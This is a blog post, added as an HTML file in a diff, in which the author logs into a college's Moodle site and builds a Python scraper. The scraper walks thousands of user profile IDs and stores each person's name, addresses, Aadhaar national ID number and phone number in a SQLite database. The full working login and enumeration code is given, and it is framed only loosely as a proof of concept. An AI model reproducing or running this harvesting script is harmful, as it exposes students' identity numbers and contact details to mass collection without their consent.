@@ -1,0 +1,256 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="description" content="">
+        <meta name="keywords" content="">
+        <meta name="author" content="">
+
+        <!-- Open Graph / Facebook / Discord -->
+        <meta property="og:type" content="website">
+        <meta property="og:title" content="">
+        <meta property="og:description" content="">
+        <meta property="og:url" content="https://syswraith.github.io/elanor">
+        <meta property="og:image" content="https://github.com/syswraith/elanor/blob/main/assets/icon.png?raw=true">
+
+        <!-- Twitter -->
+        <meta name="twitter:card" content="summary_large_image">
+        <meta name="twitter:title" content="">
+        <meta name="twitter:description" content="">
+        <meta name="twitter:image" content="https://github.com/syswraith/elanor/blob/main/assets/icon.png?raw=true">
+        <meta property="twitter:domain" content="syswraith.github.io">
+        <meta property="twitter:url" content="https://syswraith.github.io/elanor">
+
+
+        <title></title>
+        <style>html{visibility: hidden;opacity:0;}</style>
+        <link rel="stylesheet" href="pygments.css" type="text/css">
+        <link rel="stylesheet" href="https://unpkg.com/sakura.css/css/sakura.css" type="text/css" media="print" onload="this.media='all'">
+        <link rel="icon" type="image/x-icon" href="favicon.ico">
+        <script>
+            window.onload = () => { 
+                document.querySelector('html').style.visibility = "visible";
+                document.querySelector('html').style.opacity = 1;
+            };
+        </script>
+
+        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.8/dist/katex.min.css">
+        <script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.8/dist/katex.min.js"></script>
+        <script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.8/dist/contrib/auto-render.min.js"></script>
+        <script>
+            document.addEventListener("DOMContentLoaded", function() {
+                renderMathInElement(document.body, {
+                    delimiters: [
+                        {left: "$$", right: "$$", display: true},
+                        {left: "\\(", right: "\\)", display: false}
+                    ]
+                });
+            });
+        </script>
+
+        <noscript>
+            This page uses minimal and non-harmful JavaScript to avoid Flash of Unstyled Content. 
+            The source code is available at https://github.com/syswraith/elanor free for anyone to inspect or modify. 
+        </noscript>
+    </head>
+    <body>
+        <h1>Synopsis</h1>
+<p>Been messing around with my college's Moodle instance for about 6 months. Found a few interesting data fields on people's profiles. It's been way too long since I've visited my web-scraping origins (I used to web scrape for a living at one point!) so this seems good as any opportunity.</p>
+<p>Please note that no data will be leaked in this quest, and any and all data shown for demonstration purposes will be censored for ensuring the privacy of their respective owners. This is a <strong>PROOF OF CONCEPT</strong> and not intended for offensive use.</p>
+<p>Moodle is an open-source learning platform written majorly in PHP and licensed under the GNU GPL 3.0 license.</p>
+<h2>Moodle Tech Breakdown</h2>
+<ul>
+<li>PHP (78.7%)</li>
+<li>JavaScript (14.0%)</li>
+<li>Gherkin (3.5%)</li>
+<li>CSS (1.7%)</li>
+<li>Mustache (1.6%)</li>
+<li>SCSS (0.4%)</li>
+<li>Other (0.1%)</li>
+</ul>
+<p>I'm going to try and do some reconnaissance first on how the site handles authentication and how it serves the data I'm interested in—by observing the requests made and the cookies set. Then I'm going to build a scraper to extract the data that I'm interested in.</p>
+<h2>Here's everything I'll be using in this post:</h2>
+<ul>
+<li><a href="https://www.mozilla.org/en-US/firefox/">Firefox</a></li>
+<li><a href="https://cookie-editor.com/">Cookie editor extension</a></li>
+<li><a href="https://sqlitebrowser.org/">DB4S</a></li>
+<li><a href="https://moodle.org/">Moodle</a></li>
+<li><a href="https://www.python.org/">python</a></li>
+<li><a href="https://requests.readthedocs.io/en/latest/">requests</a></li>
+<li><a href="https://lxml.de/">lxml</a></li>
+<li><a href="https://pypi.org/project/cssselect/">cssselect</a></li>
+<li><a href="http://github.com/syswraith/moodle-scraper">GitHub repository</a></li>
+</ul>
+<p>Let's get started!</p>
+<h1>Authentication</h1>
+<p>First things that I notice right off the bat are:
+- The LMS is written in PHP meaning majority of the operations might be handled without having to execute any JavaScript code. That's good.
+- With the Cookie-Editor extension, I can see that a cookie named <code>MoodleSession</code> is being set to a random string of 26 alphanumeric characters. That's interesting.</p>
+<p><img alt="moodle scraper" src="../images/moodle_scraper/moodle_session_cookie.png" /></p>
+<p>Secondly, authenticating myself with a username and password makes the equivalent of the following cURL request:</p>
+<div class="codehilite"><pre><span></span><code>curl<span class="w"> </span><span class="s1">&#39;https://lms.example.edu.in/login/index.php&#39;</span><span class="w"> </span>-X<span class="w"> </span>POST<span class="w"> </span>-H<span class="w"> </span><span class="s1">&#39;User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:132.0) Gecko/20100101 Firefox/132.0&#39;</span><span class="w"> </span>-H<span class="w"> </span><span class="s1">&#39;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#39;</span><span class="w"> </span>-H<span class="w"> </span><span class="s1">&#39;Accept-Language: en-US,en;q=0.5&#39;</span><span class="w"> </span>-H<span class="w"> </span><span class="s1">&#39;Accept-Encoding: gzip, deflate, br, zstd&#39;</span><span class="w"> </span>-H<span class="w"> </span><span class="s1">&#39;Content-Type: application/x-www-form-urlencoded&#39;</span><span class="w"> </span>-H<span class="w"> </span><span class="s1">&#39;Origin: https://lms.example.edu.in&#39;</span><span class="w"> </span>-H<span class="w"> </span><span class="s1">&#39;Connection: keep-alive&#39;</span><span class="w"> </span>-H<span class="w"> </span><span class="s1">&#39;Referer: https://lms.example.edu.in/&#39;</span><span class="w"> </span>-H<span class="w"> </span><span class="s1">&#39;Cookie: MoodleSession=pb0nit3tf74c0b4tmkik6emac4&#39;</span><span class="w"> </span>-H<span class="w"> </span><span class="s1">&#39;Upgrade-Insecure-Requests: 1&#39;</span><span class="w"> </span>-H<span class="w"> </span><span class="s1">&#39;Sec-Fetch-Dest: document&#39;</span><span class="w"> </span>-H<span class="w"> </span><span class="s1">&#39;Sec-Fetch-Mode: navigate&#39;</span><span class="w"> </span>-H<span class="w"> </span><span class="s1">&#39;Sec-Fetch-Site: same-origin&#39;</span><span class="w"> </span>-H<span class="w"> </span><span class="s1">&#39;Sec-Fetch-User: ?1&#39;</span><span class="w"> </span>-H<span class="w"> </span><span class="s1">&#39;Priority: u=0, i&#39;</span><span class="w"> </span>--data-raw<span class="w"> </span><span class="s1">&#39;logintoken=3TnGvxtmc1PfYcLuWzk5MUfF7E9balQs&amp;username=username&amp;password=password-url-encoded&#39;</span>
+</code></pre></div>
+
+<ul>
+<li>This tells us that there are two <code>MoodleSession</code> cookies, one before authentication and one after authentication.</li>
+<li>Usernames and passwords are being URL-encoded and sent in plain-text over the HTTP POST request.</li>
+<li>It took me a few tries but I finally found <code>logintoken</code> sneakily nested inside the page's source code in the following way:</li>
+</ul>
+<p><img alt="login token" src="images/moodle_scraper/logintoken_nested.png" /></p>
+<h1>Writing the script</h1>
+<p>Now that we're done with some passive reconnaissance, let's get to the script!</p>
+<p>Create a <code>userpass.json</code> file to store credentials:</p>
+<div class="codehilite"><pre><span></span><code><span class="p">{</span>
+<span class="w">  </span><span class="nt">&quot;username&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;username here&quot;</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;password&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;password here&quot;</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<div class="codehilite"><pre><span></span><code><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&quot;userpass.json&quot;</span><span class="p">)</span> <span class="k">as</span> <span class="n">auth_data</span><span class="p">:</span>
+    <span class="n">auth_creds</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">auth_data</span><span class="o">.</span><span class="n">read</span><span class="p">())</span>
+<span class="n">uname</span> <span class="o">=</span> <span class="n">auth_creds</span><span class="p">[</span><span class="s2">&quot;username&quot;</span><span class="p">]</span>
+<span class="n">upass</span> <span class="o">=</span> <span class="n">auth_creds</span><span class="p">[</span><span class="s2">&quot;password&quot;</span><span class="p">]</span>
+</code></pre></div>
+
+<p>Start session and fetch <code>logintoken</code>:</p>
+<div class="codehilite"><pre><span></span><code><span class="n">session</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">Session</span><span class="p">()</span>
+<span class="n">first_response</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&quot;https://lms.example.edu.in/&quot;</span><span class="p">)</span>
+<span class="n">first_dom_tree</span> <span class="o">=</span> <span class="n">html</span><span class="o">.</span><span class="n">fromstring</span><span class="p">(</span><span class="n">first_response</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
+<span class="n">login_token</span> <span class="o">=</span> <span class="n">first_dom_tree</span><span class="o">.</span><span class="n">cssselect</span><span class="p">(</span><span class="s2">&quot;#pre-login-form &gt; input:nth-child(1)&quot;</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&quot;value&quot;</span><span class="p">)</span>
+</code></pre></div>
+
+<p>Post authentication data:</p>
+<div class="codehilite"><pre><span></span><code><span class="n">data</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&quot;logintoken&quot;</span><span class="p">:</span> <span class="n">login_token</span><span class="p">,</span> <span class="s2">&quot;username&quot;</span><span class="p">:</span> <span class="n">uname</span><span class="p">,</span> <span class="s2">&quot;password&quot;</span><span class="p">:</span> <span class="n">upass</span><span class="p">}</span>
+<span class="n">second_response</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="s2">&quot;https://lms.example.edu.in/login/index.php&quot;</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">allow_redirects</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+</code></pre></div>
+
+<p>Scrape profile fields:</p>
+<div class="codehilite"><pre><span></span><code><span class="n">third_response</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;https://lms.example.edu.in/user/profile.php?id=</span><span class="si">{</span><span class="n">x</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+<span class="n">third_dom_tree</span> <span class="o">=</span> <span class="n">html</span><span class="o">.</span><span class="n">fromstring</span><span class="p">(</span><span class="n">third_response</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
+
+<span class="k">try</span><span class="p">:</span>
+    <span class="n">name</span> <span class="o">=</span> <span class="n">third_dom_tree</span><span class="o">.</span><span class="n">cssselect</span><span class="p">(</span><span class="s2">&quot;.fullname &gt; span:nth-child(1)&quot;</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">text</span><span class="o">.</span><span class="n">strip</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+<span class="k">except</span> <span class="ne">IndexError</span><span class="p">:</span>
+    <span class="k">continue</span>
+</code></pre></div>
+
+<p>Scrape more fields and wrap it in a loop:</p>
+<div class="codehilite"><pre><span></span><code><span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">7000</span><span class="p">):</span>
+    <span class="nb">print</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
+    <span class="n">third_response</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;https://lms.example.edu.in/user/profile.php?id=</span><span class="si">{</span><span class="n">x</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+    <span class="n">third_dom_tree</span> <span class="o">=</span> <span class="n">html</span><span class="o">.</span><span class="n">fromstring</span><span class="p">(</span><span class="n">third_response</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
+
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">name</span> <span class="o">=</span> <span class="n">third_dom_tree</span><span class="o">.</span><span class="n">cssselect</span><span class="p">(</span><span class="s2">&quot;.fullname &gt; span:nth-child(1)&quot;</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">text</span><span class="o">.</span><span class="n">strip</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span> 
+    <span class="k">except</span> <span class="ne">IndexError</span><span class="p">:</span>
+        <span class="k">continue</span>
+
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">laddr</span> <span class="o">=</span> <span class="n">third_dom_tree</span><span class="o">.</span><span class="n">cssselect</span><span class="p">(</span><span class="s2">&quot;li.contentnode:nth-child(3) &gt; dl:nth-child(1) &gt; dd:nth-child(2) &gt; div:nth-child(1) &gt; table:nth-child(2) &gt; tbody:nth-child(2) &gt; tr:nth-child(1) &gt; td:nth-child(1)&quot;</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">text</span><span class="o">.</span><span class="n">strip</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+    <span class="k">except</span> <span class="ne">IndexError</span><span class="p">:</span>
+        <span class="n">laddr</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span>
+
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">paddr</span> <span class="o">=</span> <span class="n">third_dom_tree</span><span class="o">.</span><span class="n">cssselect</span><span class="p">(</span><span class="s2">&quot;.custom_field_CorrespondenceAddressPermanent &gt; dl:nth-child(1) &gt; dd:nth-child(2) &gt; div:nth-child(1) &gt; table:nth-child(2) &gt; tbody:nth-child(2) &gt; tr:nth-child(1) &gt; td:nth-child(1)&quot;</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">text</span><span class="o">.</span><span class="n">strip</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+    <span class="k">except</span> <span class="ne">IndexError</span><span class="p">:</span>
+        <span class="n">paddr</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span>
+
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">aadhar</span> <span class="o">=</span> <span class="n">third_dom_tree</span><span class="o">.</span><span class="n">cssselect</span><span class="p">(</span><span class="s2">&quot;.custom_field_AaadharNo &gt; dl:nth-child(1) &gt; dd:nth-child(2)&quot;</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">text</span><span class="o">.</span><span class="n">strip</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+    <span class="k">except</span> <span class="ne">IndexError</span><span class="p">:</span>
+        <span class="n">aadhar</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
+
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">phone</span> <span class="o">=</span> <span class="n">third_dom_tree</span><span class="o">.</span><span class="n">cssselect</span><span class="p">(</span><span class="s2">&quot;.custom_field_ContactNumber &gt; dl:nth-child(1) &gt; dd:nth-child(2)&quot;</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">text</span><span class="o">.</span><span class="n">strip</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+    <span class="k">except</span> <span class="ne">IndexError</span><span class="p">:</span>
+        <span class="n">phone</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
+</code></pre></div>
+
+<p>Push to SQLite:</p>
+<div class="codehilite"><pre><span></span><code><span class="n">conn</span> <span class="o">=</span> <span class="n">sqlite3</span><span class="o">.</span><span class="n">connect</span><span class="p">(</span><span class="s2">&quot;person_data.db&quot;</span><span class="p">)</span>
+<span class="n">cursor</span> <span class="o">=</span> <span class="n">conn</span><span class="o">.</span><span class="n">cursor</span><span class="p">()</span>
+<span class="n">cursor</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="s2">&quot;&quot;&quot;</span>
+<span class="s2">CREATE TABLE IF NOT EXISTS persons (</span>
+<span class="s2">    uid INTEGER PRIMARY KEY,</span>
+<span class="s2">    name TEXT NOT NULL,</span>
+<span class="s2">    laddr TEXT,</span>
+<span class="s2">    paddr TEXT,</span>
+<span class="s2">    aadhar TEXT,</span>
+<span class="s2">    phone TEXT</span>
+<span class="s2">)</span>
+<span class="s2">&quot;&quot;&quot;</span><span class="p">)</span>
+<span class="n">conn</span><span class="o">.</span><span class="n">commit</span><span class="p">()</span>
+</code></pre></div>
+
+<p>Create a class:</p>
+<div class="codehilite"><pre><span></span><code><span class="k">class</span><span class="w"> </span><span class="nc">Person</span><span class="p">:</span>
+    <span class="k">def</span><span class="w"> </span><span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">name</span><span class="p">,</span> <span class="n">uid</span><span class="p">,</span> <span class="n">laddr</span><span class="p">,</span> <span class="n">paddr</span><span class="p">,</span> <span class="n">aadhar</span><span class="p">,</span> <span class="n">phone</span><span class="p">):</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">name</span> <span class="o">=</span> <span class="n">name</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">uid</span> <span class="o">=</span> <span class="n">uid</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">laddr</span> <span class="o">=</span> <span class="n">laddr</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">paddr</span> <span class="o">=</span> <span class="n">paddr</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">aadhar</span> <span class="o">=</span> <span class="n">aadhar</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">phone</span> <span class="o">=</span> <span class="n">phone</span>
+
+    <span class="k">def</span><span class="w"> </span><span class="fm">__str__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="k">return</span> <span class="sa">f</span><span class="s1">&#39;&quot;uid&quot;:&quot;</span><span class="si">{</span><span class="bp">self</span><span class="o">.</span><span class="n">uid</span><span class="si">}</span><span class="s1">&quot;,name&quot;:&quot;</span><span class="si">{</span><span class="bp">self</span><span class="o">.</span><span class="n">name</span><span class="si">}</span><span class="s1">&quot;,&quot;laddr&quot;:&quot;</span><span class="si">{</span><span class="bp">self</span><span class="o">.</span><span class="n">laddr</span><span class="si">}</span><span class="s1">&quot;,&quot;paddr&quot;:&quot;</span><span class="si">{</span><span class="bp">self</span><span class="o">.</span><span class="n">paddr</span><span class="si">}</span><span class="s1">&quot;,&quot;aadhar&quot;:&quot;</span><span class="si">{</span><span class="bp">self</span><span class="o">.</span><span class="n">aadhar</span><span class="si">}</span><span class="s1">&quot;,&quot;phone&quot;:&quot;</span><span class="si">{</span><span class="bp">self</span><span class="o">.</span><span class="n">phone</span><span class="si">}</span><span class="s1">&quot;&#39;</span>
+
+    <span class="k">def</span><span class="w"> </span><span class="nf">save_to_db</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">connection</span><span class="p">):</span>
+        <span class="n">cursor</span> <span class="o">=</span> <span class="n">connection</span><span class="o">.</span><span class="n">cursor</span><span class="p">()</span>
+        <span class="n">cursor</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="s2">&quot;&quot;&quot;</span>
+<span class="s2">        INSERT OR REPLACE INTO persons (uid, name, laddr, paddr, aadhar, phone)</span>
+<span class="s2">        VALUES (?, ?, ?, ?, ?, ?)</span>
+<span class="s2">        &quot;&quot;&quot;</span><span class="p">,</span> <span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">uid</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">name</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">laddr</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">paddr</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">aadhar</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">phone</span><span class="p">))</span>
+        <span class="n">connection</span><span class="o">.</span><span class="n">commit</span><span class="p">()</span>
+</code></pre></div>
+
+<p>Final loop:</p>
+<div class="codehilite"><pre><span></span><code><span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">15000</span><span class="p">,</span><span class="mi">26200</span><span class="p">):</span>
+    <span class="n">third_response</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;https://lms.example.edu.in/user/profile.php?id=</span><span class="si">{</span><span class="n">x</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+    <span class="n">third_dom_tree</span> <span class="o">=</span> <span class="n">html</span><span class="o">.</span><span class="n">fromstring</span><span class="p">(</span><span class="n">third_response</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
+
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">name</span> <span class="o">=</span> <span class="n">third_dom_tree</span><span class="o">.</span><span class="n">cssselect</span><span class="p">(</span><span class="s2">&quot;.fullname &gt; span:nth-child(1)&quot;</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">text</span><span class="o">.</span><span class="n">strip</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span> 
+    <span class="k">except</span> <span class="ne">IndexError</span><span class="p">:</span>
+        <span class="k">continue</span>
+
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">laddr</span> <span class="o">=</span> <span class="n">third_dom_tree</span><span class="o">.</span><span class="n">cssselect</span><span class="p">(</span><span class="s2">&quot;li.contentnode:nth-child(3) &gt; dl:nth-child(1) &gt; dd:nth-child(2) &gt; div:nth-child(1) &gt; table:nth-child(2) &gt; tbody:nth-child(2) &gt; tr:nth-child(1) &gt; td:nth-child(1)&quot;</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">text</span><span class="o">.</span><span class="n">strip</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+    <span class="k">except</span> <span class="ne">IndexError</span><span class="p">:</span>
+        <span class="n">laddr</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span>
+
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">paddr</span> <span class="o">=</span> <span class="n">third_dom_tree</span><span class="o">.</span><span class="n">cssselect</span><span class="p">(</span><span class="s2">&quot;.custom_field_CorrespondenceAddressPermanent &gt; dl:nth-child(1) &gt; dd:nth-child(2) &gt; div:nth-child(1) &gt; table:nth-child(2) &gt; tbody:nth-child(2) &gt; tr:nth-child(1) &gt; td:nth-child(1)&quot;</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">text</span><span class="o">.</span><span class="n">strip</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+    <span class="k">except</span> <span class="ne">IndexError</span><span class="p">:</span>
+        <span class="n">paddr</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span>
+
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">aadhar</span> <span class="o">=</span> <span class="n">third_dom_tree</span><span class="o">.</span><span class="n">cssselect</span><span class="p">(</span><span class="s2">&quot;.custom_field_AaadharNo &gt; dl:nth-child(1) &gt; dd:nth-child(2)&quot;</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">text</span><span class="o">.</span><span class="n">strip</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+    <span class="k">except</span> <span class="ne">IndexError</span><span class="p">:</span>
+        <span class="n">aadhar</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
+
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">phone</span> <span class="o">=</span> <span class="n">third_dom_tree</span><span class="o">.</span><span class="n">cssselect</span><span class="p">(</span><span class="s2">&quot;.custom_field_ContactNumber &gt; dl:nth-child(1) &gt; dd:nth-child(2)&quot;</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">text</span><span class="o">.</span><span class="n">strip</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+    <span class="k">except</span> <span class="ne">IndexError</span><span class="p">:</span>
+        <span class="n">phone</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
+
+    <span class="n">person</span> <span class="o">=</span> <span class="n">Person</span><span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="n">x</span><span class="p">,</span> <span class="n">laddr</span><span class="p">,</span> <span class="n">paddr</span><span class="p">,</span> <span class="n">aadhar</span><span class="p">,</span> <span class="n">phone</span><span class="p">)</span>
+    <span class="n">person</span><span class="o">.</span><span class="n">save_to_db</span><span class="p">(</span><span class="n">conn</span><span class="p">)</span>
+    <span class="nb">print</span><span class="p">(</span><span class="n">person</span><span class="p">)</span>
+
+<span class="n">conn</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</code></pre></div>
+
+<h1>Output</h1>
+<p>Scraped data output from the console:</p>
+<p><img alt="scraped data" src="images/moodle_scraper/scraped_data_console.png" /></p>
+<p>Scraped data from the database:</p>
+<p><img alt="scraped data db" src="images/moodle_scraper/scraped_data_db.jpg" /></p>
+<h1>Parting thoughts</h1>
+<blockquote>
+<p>"In God we trust. All others must bring data." — W. Edwards Deming</p>
+</blockquote>
+<p>Keep yours safe :)</p>
+    </body>
+</html>
